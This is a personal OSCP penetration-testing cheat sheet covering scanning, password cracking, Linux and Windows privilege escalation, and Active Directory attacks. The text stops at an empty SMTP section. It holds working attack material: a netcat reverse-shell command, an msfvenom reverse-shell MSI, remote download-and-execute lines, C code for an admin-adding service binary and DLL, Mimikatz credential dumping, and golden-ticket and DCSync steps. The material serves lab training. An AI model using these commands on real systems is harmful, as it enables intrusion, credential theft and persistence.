### General OSCP

#### VPN

Connect to OffSec labs

```sh
sudo openvpn /home/kali/Documents/offsec/universal.ovpn 
```

#### SSH tip

The `UserKnownHostsFile=/dev/null` and `StrictHostKeyChecking=no` options have been added to prevent the known-hosts file on our local Kali machine from being corrupted.

```sh
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" USER@IP
```

#### RDP

```sh
xfreerdp3 /u:USER/p:PASS /v:IP /dynamic-resolution
rdesktop IP -u USER -p PASS
```

### Standard Actions for All Boxes

Baseline commands to run against every box, regardless of findings so far.

#### General

```sh
# Full port scan (don't rely on top-1000)
sudo nmap -p- IP -oN full-tcp.txt
# Service/version detection + default scripts on found ports
sudo nmap -A -p PORTS IP -oN services.txt
# Quick UDP top ports (often skipped, often has SNMP/DNS)
sudo nmap -sU --top-ports 20 IP -oN udp-top.txt
# Save all loot in a per-box folder
mkdir -p ~/ctf/IP/{loot,scans,exploits}
# Check if hostname resolves / add to hosts file
echo "IP HOSTNAME" | sudo tee -a /etc/hosts
```

#### Linux

```sh
# Run immediately after getting any shell
id; whoami; hostname; uname -a
cat /etc/os-release
sudo -l
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron*
netstat -tulnp 2>/dev/null || ss -tulnp
cat /etc/passwd
ls -la /home /root 2>/dev/null
history
cat /proc/version
# Always run LinPEAS as a baseline, even if nothing jumps out manually
./linpeas.sh -a > /dev/shm/linpeas.txt
```

#### Windows

```ps1
# Run immediately after getting any shell
whoami /all
systeminfo
hostname
ipconfig /all
net user
net localgroup administrators
Get-Process
tasklist /svc
schtasks /query /fo LIST /v
# Check AV/EDR presence
Get-MpComputerStatus
# Always run WinPEAS as a baseline
.\winPEAS.exe
# Check for stored creds / unattended installs
cmdkey /list
Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue
```

#### Active Directory

```sh
# Run as soon as any domain credential (even low-priv) is obtained
nxc smb IP -u 'USER' -p 'PASS' --shares
nxc smb IP -u 'USER' -p 'PASS' --users
nxc smb IP -u 'USER' -p 'PASS' --groups
nxc smb IP -u 'USER' -p 'PASS' --loggedon-users
nxc ldap IP -u 'USER' -p 'PASS' --password-not-required
nxc ldap IP -u 'USER' -p 'PASS' --kerberoasting kerberoast.txt
nxc ldap IP -u 'USER' -p 'PASS' --asreproast asrep.txt
# Baseline BloodHound collection
nxc ldap IP -u 'USER' -p 'PASS' --bloodhound -c All
# Check password policy and RID brute as baseline
nxc smb IP -u 'USER' -p 'PASS' --pass-pol
nxc smb IP -u 'USER' -p 'PASS' --rid-brute
```

### Reconaissance & Scanning

#### Netcat

```sh
# Netcat TCP ports 3388-3390, 1 second timeout, zero I/O (data)
nc -nvv -w 1 -z IP 3388-3390
# Netcat UDP ports 120-123, 1 second timeout, zero I/O (data)
nc -nv -u -z -w 1 IP 120-123
```

#### Nikto

HTTP(S) only.

```sh
nikto -h http://target.com
```

#### Nmap

```sh
# Scan all TCP ports, stealth and fast (no ACK)
sudo nmap -sU -sS -vv IP
# Scan UDP ports
sudo nmap -F -sU -vv IP
# Discovery scan, greppable format
nmap -v -sn IP -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2
# TCP scan, top 20 ports, with OS version detection, script scanning, and traceroute
nmap -sT -A --top-ports=20 IP -oG top-port-sweep.txt
# OS fingerprinting (guess)
sudo nmap -O IP --osscan-guess
# Vulnerability scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
# Check scripts
ls /usr/share/nmap/scripts/ | grep TERM
```

#### Nuclei

```sh
nuclei -target https://example.com
```

#### PowerShell

```ps1
# PowerShell scanning (living off the land)
Test-NetConnection -Port 445 IP
# PowerShell scan first 1024 ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
```

### Exploitation

#### Exploits

##### SearchSploit

[Exploit-DB](https://www.exploit-db.com/)

```sh
sudo apt update && sudo apt install exploitdb

# Search terms
searchsploit afd windows local
# Show complete path
searchsploit -p 39446
# Exclude
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
# Strict
searchsploit -s Apache Struts 2.0.0
# JSON output
searchsploit -j 55555 | json_pp
# Download
searchsploit -m windows/remote/48537.py
searchsploit -m 42031
```

##### Metasploit

``` sh
msfconsole
# Open HTML file with module information
info -d 
```

#### Command Injection

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md)

#### SQL Injection

##### Payloads

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md) 

##### sqlmap

```sh
# sqlmap
sqlmap -u http://IP/index.php?user=1 -p user
# sqlmap with saved POST request
sqlmap -r post.txt -p user 
# sqlmap with dump
sqlmap -u http://IP/index.php?user=1 -p user --dump
# sqlmap with shell
sqlmap -u http://IP/index.php?user=1 -p user --os-shell
```

#### Password Attacks

##### Brute Force

[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)

[https://weakpass.com/](https://weakpass.com/)

[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

[https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables](https://cloud.google.com/blog/topics/threat-intelligence/net-ntlmv1-deprecation-rainbow-tables)

###### Wordlists

```sh
# Kali lists
# Passwords
/usr/share/wordlists/rockyou.txt
# Usernames
/usr/share/wordlists/dirb/others/names.txt 

# Generate wordlist with min/max 6 characters (lab***)
crunch 6 6 -t lab%%% > wordlist
```

###### Hydra & FFUF

```sh
# Hydra
# Attempt single user name with password list
hydra -l USER -P PASSLIST -s PORT PROTO://IP
# Attempt login on HTTP POST form
hydra -l USER -P PASSLIST IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# HTTP get (basic auth)
hydra -L USERLIST -P PASSLIST IP http-get /path/to/login
# HTTP basic auth, no 10s wait, verbose, failure=401
hydra -I -V -l USER -P PASSLIST "http-get://IP/webdav:A=BASIC:F=401"
# RDP single task (throttled to limit errors)
hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://IP -t 1 -v
# SSH
hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh -V
# FTP (also check empty, username, and reversed username password)
hydra -l 'admin' -P SecLists/Passwords/Default-Credentials/default-passwords.txt ftp://192.168.105.46 -e nsr -V

# FFUF
# Use request saved with Burp (make sure to put in FUZZ)
# Contains autoalign, force HTTP, and proxy via Burp
ffuf -w /usr/share/wordlists/rockyou.txt -request flatpress_login -ac -x http://127.0.0.1:8080 -request-proto http
```

###### JohnTheRipper

``` sh
# Crack SSH private key, run with ruleset
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
# Convert SSH hash
ssh2john id_rsa > ssh.hash 
# Convert and crack PDF hash
pdf2john PDF.pdf > pdf_hash.txt    
john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt
```

##### Cracking

[https://hashcat.net/hashcat/](https://hashcat.net/hashcat/) (mainly GPU, also support CPU)

[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (hash modes and example hashes)

[https://hashcat.net/wiki/doku.php?id=rule\_based\_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) (rule functions)

[https://www.openwall.com/john/](https://www.openwall.com/john/) (mainly CPU, also supports GPU)

###### Hashcat

```sh
# Check hash modes available
hashcat -h | grep -i "ssh"
# Benchmark mode
hashcat -b
# Brute force MD5
hashcat -m 0
# Use rules, debug mode 
hashcat -r demo.rule --stdout wordlist.txt
# Rule to append !, 1, and capitalize first letter en lowercase the rest
$! $1 c
# Included rules
ls -la /usr/share/hashcat/rules/
# Crack MD5 with ruleset
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r rules.rule

# Identify hash type
hash-identifier
hashid

# KeePass example
# Find KeePass database file (Windows)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Convert KeePass database file to hash (remove filename in file)
keepass2john Database.kdbx > keepass.hash
cat keepass.hash   
	$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
# Crack password
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# NTLM
# Get local users
Get-LocalUser
# Run Mimikatz in elevated PowerShell window
.\mimikatz.exe
# Enable SeDebugPrivilege for needed debug privs
privilege::debug
# Elevate to SYSTEM privs
token::elevate
# Option 1 (local user): extract NThashes from SAM
lsadump::sam
# Option 2 (domain user): extract NThashes from LSASS
sekurlsa::logonpasswords
# Crack NThash with Hashcat, with best66 rules
hashcat -m 1000 HASHFILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

### Privilege Escalation

#### Linux

[HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) 
[compendium by g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
[PayloadsAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/)

##### Enumeration

```sh
# Basics
id
whoami
hostname
uname -a
arch
cat /etc/os-release
groups
env
set
ps aux | cat
ls -la /home

# Enumerate packages and kernel modules for vulnerabilities
dpkg -l
lsmod
/sbin/modinfo <BINARY>

# Enumerate network configuration
# Check interfaces
ip addr
# Check routes
ip route
route
routel
# Check listening ports
netstat -tulnp

# Enumerate users
cat /etc/passwd
cat /etc/shadow

# Enumerate cronjobs
cat /etc/crontab
crontab -l
sudo crontab -l
ls -la /etc/cron*
grep -i "CRON" /var/log/syslog

# Display (other user) processes running in Linux with pspy
# https://github.com/dominicbreuker/pspy
python3 -m http.server 80
wget http://IP/pspy32s
./pspy32s
# Look for cmdline processes
cat /proc/self/cmdline 

# Check SSH config
# Check for: PermitRootLogin yes
# Check for: (#)PasswordAuthentication yes
cat /etc/ssh/sshd_config

# SUID / GUID
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"

# Find all writable files/folders
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
find / -writable -type d 2>/dev/null
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers

# Find sensitive files
grep --color=auto -rnw '.' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

# Look for commands in sudoers file
sudo -l

# Check sudo version
sudo -V

# Pivot to other user
su USER

# Check capabilities
# https://hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html
getcap -r / 2>/dev/null

# Check services
systemctl list-units
systemctl status SERVICE
/etc/systemd/system/SERVICE.service

# Find mounted drives
mount
cat /etc/fstab
# Find available disks for mounting
lsblk

# Files in temporary directories
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm

# Find emails
ls -la /var/mail

# Run LinPEAS
# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
python3 -m http.server 80
wget http://LOCALIP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > /dev/shm/linpeas.txt 
less -r /dev/shm/linpeas.txt
# Run LinuxSmartEnumeration
python3 -m http.server 80
wget http://LOCALIP/lse.sh
chmod +x lse.sh
./lse.sh -l1
```

##### SUID/GUID

Find binaries with SUID/GUID bit set. Use [GTFOBins](https://gtfobins.org/) to further exploit. Note that some binaries need to be run with `sudo` and therefore require the password of the local user.

``` sh
# SUID
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap"
# GUID
find / -perm -g=s -type f 2>/dev/null | grep -v "/snap"
```

##### Sudo / Kernel Exploits

````sh
# Check sudo version against known CVEs (e.g. CVE-2021-3156 Baron Samedit)
sudo -V
# GTFOBins-style sudo misconfig abuse
sudo -l

# PwnKit (CVE-2021-4034) check
pkexec --version

# Kernel exploit suggestion
searchsploit linux kernel $(uname -r)
# Or use linux-exploit-suggester
./linux-exploit-suggester.sh
````

##### Cron Jobs

````sh
# Check writable scripts referenced by cron
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
find / -writable 2>/dev/null | grep -i cron

# PATH hijack if cron script calls binary without full path
echo $PATH
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/writable/script
````

##### Docker Group / Capabilities Abuse

````sh
# Docker group membership = root equivalent
groups
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Capabilities abuse (e.g. cap_setuid on python)
getcap -r / 2>/dev/null
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
````

##### NFS no_root_squash

````sh
# On attacker, check export
showmount -e IP
cat /etc/exports

# Mount and plant SUID binary
mkdir /tmp/nfs
mount -o rw,vers=3 IP:/share /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
# On target
/share/rootbash -p
````

#### Windows

##### Enumeration

``` ps1
# Username and hostname
whoami
# Privileges
# https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#abusing-tokens
whoami /priv
# Groups user is member of
whoami /groups
# Other users
net user
Get-LocalUser
net user USERNAME
# Other groups
net localgroup
Get-LocalGroup
# Group members
Get-LocalGroupMember GROUPNAME

# System info
systeminfo
# Always look in any specific service folders related to the challenge
../*config*
../*users*
etc
# Network info
ipconfig /all
route print
netstat -ano
# Installed apps (32/64 bit)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
C:\Program Files
C:\Program Files (x86)
C:\Users\*\Downloads
# Processes
Get-Process

# Interesting files / folders
# Keepass DBs
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# XAMMP config files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
# Home directory documents
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# PowerShell
# User command history
Get-History
(Get-PSReadlineOption).HistorySavePath
# Create WinRM session
evil-winrm -i IP -u USER -p "PASS"

# WinPEAS
# Serve winPEAS from home directory and download
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
iwr -uri http://IP/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

##### Execute as other user

``` sh
# Run cmd as other user (need password)
runas /user:USER cmd

# RunAsc (more options)
# https://github.com/antonioCoco/RunasCs
# Open reverse shell
Invoke-RunasCs -Username USER -Password PASS -Command cmd.exe -Remote IP:PORT

# Run as other user in PowerShell
password = ConvertTo-SecureString "PASS" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("DOMAIN\USER", $password)
Get-ADUser -Identity USER -Credential $credential
nc -nlvp 4445
Start-Process powershell -Credential $credential -ArgumentList "-nop -w hidden -e BASE64"
```

##### Windows Services

``` ps1
# List services
services.msc (GUI)
Get-Service
Get-CimInstance
# Example
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
wmic service get name,startname

# Enumerate binary permissions, look for write 
icacls "PATH_TO_BINARY"
Get-ACL

# Replace binary with custom one (see code below)
# Compile for 64-bit 
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
# Download and replace service on victim; example
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Restart service (needs permissions)
net stop SERVICENAME
# In case of lacking permissions, check if it autostarts at boot
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'SERVICENAME'}
# In case of autostart, check if we have SeShutdownPrivilege
whoami /priv
# Reboot
shutdown /r /t 0
# Check user is in admin group after reboot
Get-LocalGroupMember administrators
```

##### DLL Hijacking

``` ps1
# Standard DLL search order (safe mode)
# When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

# Abuse missing DLL (Filezilla example)
# Enumerate installed apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
# Find DLL hijack vulnerability for : https://nvd.nist.gov/vuln/detail/CVE-2023-53959
# Check if we have write permissions in app directory
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
# Leverage Procmon to see loaded DLLs
C:\tools\Procmon\Procmon64.exe
# Filter for process (filezilla.exe) and clear events
# Run app
# Look for CreateFile operations (also includes accessing existing files)
# Create malicious DLL to replace original one with (see code below)
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
# Download and replace
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
# Execute app with right privileges (can be other user)
```

##### Unquoted Service Paths

``` ps1
# Enumerate installed apps
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
# Alternative (cmd.exe)
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check start/stop permissions
Start-Service GammaService
Stop-Service GammaService

# Check folder permissions of subpaths (example)
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"

# Replace with malicious binary
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'

# Start service and check if creating new user worked
Start-Service GammaService
net user
net localgroup administrators
```

##### Scheduled Tasks

``` ps1
# List scheduled tasks
# Seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields
schtasks /query /fo LIST /v 
Get-ScheduledTask

# Check user permissions on scheduled task binary (example)
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe

# Replace with malicious binary
iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
# Check if it worked
net user
net localgroup administrators


# Create scheduled task to be executed as Administrator
$pw = ConvertTo-SecureString "ADMIN_PASS" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
Invoke-Command -Computer COMP_NAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr TO_EXECUTE /ru SYSTEM } -Credential $creds
Invoke-Command -Computer COMP_NAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

##### SeImpersonatePrivilege

``` ps1
# GodPotato
# Check privilege
whoami /priv
# Check .NET version
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
# Download GodPotato
certutil -urlcache -split -f http://192.168.45.235/GodPotato-NET4.exe
# Test GodPotato
.\GodPotato-NET4.exe -cmd "whoami"
# Get netcat for reverse shell
certutil -urlcache -split -f http://192.168.45.235/nc.exe
.\GodPotato-NET4.exe -cmd "nc.exe 192.168.45.235 4444 -e cmd"

# PrintSpoofer
iwr -uri http://IP/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
PrintSpoofer64.exe -i -c "cmd /c cmd.exe"

# Mimikatz
# https://adsecurity.org/?page_id=1821
# Run Mimikatz in elevated PowerShell window
.\mimikatz.exe
# Enable SeDebugPrivilege for needed debug privs
privilege::debug
# Elevate to SYSTEM privs
token::elevate
# Dump passwords
# Option 1 (local user): extract NThashes from SAM
lsadump::sam
# Option 2 (domain user): extract NThashes from LSASS
sekurlsa::logonpasswords
# Option 3 (domain user): extract NThashes from service tickets (TGT)
sekurlsa::tickets
# Inject malicious SSP (auth provider) into lsass to register to SSPI for authentication to capture plaintext creds
misc::memssp
# Check output after auth request happened
type C:\Windows\System32\mimilsa.log
```

##### AlwaysInstallElevated

````ps1
# Check both registry keys are set to 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o malicious.msi

# Execute
msiexec /quiet /qn /i malicious.msi
````

##### Stored Credentials

````ps1
# Unattended install files
Get-ChildItem -Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue

# Saved RDP / WiFi / registry creds
cmdkey /list
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
netsh wlan show profile
netsh wlan show profile name="SSID" key=clear
````

##### Code Samples

``` c
// Code to replace service binary with
// adduser.c
// The following C code will create a user named dave2 and add that user to the local Administrators group using the system function.

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

``` c
// Malicious DLL example

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

#### Active Directory

##### Enumeration

``` sh
net user /domain
net user USER /domain
net group /domain
net group "GROUP" /domain
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Find-DomainShare
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# GPP passwords
gpp-decrypt "ENCRYPTEDPASS"
```

##### PowerView

```ps1
# Load PowerView (living off the land / transferred binary)
IEX (New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1')

# Core enumeration
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroupMember "Domain Admins"
Get-DomainTrust
```

##### Bloodhound

``` sh
# Install and run
git clone https://github.com/SpecterOps/BloodHound.git
# Start docker daemon
sudo dockerd
# Start docker
sudo docker compose up -d
sudo docker compose ps
# Get password for 'admin' user
# Current: 6Br6HLOTlTtbuxfbaw3uASkbM9kd5fWg
sudo docker compose logs | grep -i -E 'password|username|credential'
sudo docker compose logs | less
/password
# Collect DB
# Run SharpHound on target
python3 -m http.server 80 --directory /usr/share/sharphound
iwr -uri http://192.168.45.229/SharpHound.exe -Outfile sharphound.exe
./sharphound.exe -c All
# Setup SMB share on host and copy to it from target
mkdir -p ~/transfer
impacket-smbserver transfer ~/transfer -smb2support
copy ARCHIVE.zip \\IP\transfer\
# Go to localhost:8080 and upload

# Queries
# Query all systems: 
MATCH (m:Computer) RETURN m
# Query all users
MATCH (m:User) RETURN m
# Active user sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
# Check 'shortest path to high value targets' using saved queries
# Check 'list all kerberoastable accounts' using saved queries
```

##### Kerberoasting

https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html

``` sh
# Check Kerberoastable users on Linux/Windows using Impacket/Powersploit/Rubeus
# Requires GenericWrite/GenericAll on target user
impacket-addspn -u DOMAIN\\USER -p PASS -s HTTP/fake IP TARGET_USER
impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER:PASS -target TARGET_USER
impacket-GetUserSPNs -request -dc-ip IP DOMAIN/USER
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt 
```

##### AS-REP Roasting

``` sh
# Check users without pre-auth
Get-DomainUser -PreauthNotRequired
impacket-GetNPUsers -dc-ip IP  -request -outputfile hashes.asreproast DOMAIN/USER

# From Linux/Windows using Impacket/Rubeus
# https://github.com/GhostPack/Rubeus
impacket-GetNPUsers -dc-ip IP  -request -outputfile hashes.asreproast DOMAIN/USER
.\Rubeus.exe asreproast /nowrap
# Crack
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

##### Silver Ticket

``` sh
# Requires SPN password hash, domain SID, and target SPN
# domain SID (omit RID; last 4 digits)
whoami /user
# Forge ticket using Mimikatz
.\mimikatz.exe
kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /ptt /target:HOST.DOMAIN /service:http /rc4:NTLM_HASH /user:USER_TO_INJECT
# Verify with klist
klist
```

##### DC Sync

``` sh
# To launch replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
# With Mimikatz from domain joined system
.\mimikatz.exe
lsadump::dcsync /user:DOMAIN\USER
# With Impacket
impacket-secretsdump -just-dc-user TARGET_USER DOMAIN/SOURCE_USER:"SOURCE_USER_PASS\!"@DC_IP

# Crack
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

##### Lateral Movement

``` sh
# WMI
# Create process on remote host from domain joined system
# User needs to be part of 'Administrators' local group
# Via wmic (deprecated)
wmic /node:IP /user:USER /password:PASS! process call create "powershell -nop -w hidden -e BASE64_REVSHELL"
# Via PowerShell
$username = 'USER';
$password = 'PASS';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName IP -Credential $credential -SessionOption $Options 
$command = 'powershell -nop -w hidden -e BASE64_REVSHELL';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

# WinRM
# See protocol section

# PsExec
# Requires (last two are defaults): 
# 1. User that authenticates to the target machine needs to be part of the Administrators local group
# 2. ADMIN$ share must be available
# 3. File and Printer Sharing has to be turned on
.\PsExec64.exe -i  \\HOST -u DOMAIN\USER -p PASS cmd

# Pass-the-Hash
# Only for NTLM auth, not Kerberos
# Requires (last two are defaults): 
# 1. User that authenticates to the target machine needs to be part of the Administrators local group
# 2. ADMIN$ share must be available
# 3. File and Printer Sharing has to be turned on
/usr/bin/impacket-wmiexec -hashes :NT_HASH USER@IP

# Overpass-the-Hash
# Upgrade NTLM hash to Kerberos TGT
# Get target user credentials cached on system (with NTLM hash), e.g. via RDP session and running notepad.exe as that user using right-click menu
# Can validate with Mimikatz
privilege::debug
sekurlsa::logonpasswords
# Get PowerShell process in context of target user
sekurlsa::pth /user:TARGET_USER /domain:DOMAIN /ntlm:NTLM_HASH /run:powershell
# Get TGT (example)
net use \\HOST
# Validate
klist
# Can now use any tool that uses Kerberos auth, like PsExec
.\PsExec.exe \\HOST cmd

# Pass-the-Ticket
# Export all TGT/TGS from useres from memory using Mimikatz
privilege::debug
sekurlsa::tickets /export
dir *.kirbi
# Inject ticket
kerberos::ptt FILENAME.kirbi
# Validate
klist
# Check if impersonation works (example)
ls \\HOST\SHARE

# DCOM
# From elevated PowerShell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","IP"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

##### Persistence

``` sh
# Golden Ticket
# Leverages krbtgt user password hash
# Requires:
# a. Domain Admin's group account 
# b. Compromised the domain controller itself
# Get krbtgt using Mimikatz on DC
privilege::debug
lsadump::lsa /patch
# Purge tickets on target host and create golden ticket
kerberos::purge
kerberos::golden /user:USER /domain:DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt
misc::cmd

# Shadow Copy (also known as Volume Shadow Service)
# Microsoft backup technology that allows the creation of snapshots of files or entire volumes
# Can be used to get NTDS.dit for offline cracking
# Requires domain admin on DC
# From elevated command prompt
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
# Dump passwords
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### Protocols

Additional information per protocol.

#### SSH (TCP: 22)

```sh
# Connect with specific SSH key only, without trying additional keys available on the system
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o 'IdentitiesOnly=yes' -i /path/to/key USER@IP
```

#### SMTP (TCP: 25)

[https://hackviser.com/tactics/pentesting/services/smtp#connect](https://hackviser.com/tactics/pentesting/services/smtp#connect) 

##### Netcat
Connect to SMTP server via netcat and verify users/email addresses:

```sh
nc -nv IP 25
VRFY root
VRFY idontexist
```

##### PowerShell

```ps1
Test-NetConnection -Port 25 IP
# Telnet (install)
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet IP 25
```

##### Nmap

``` sh
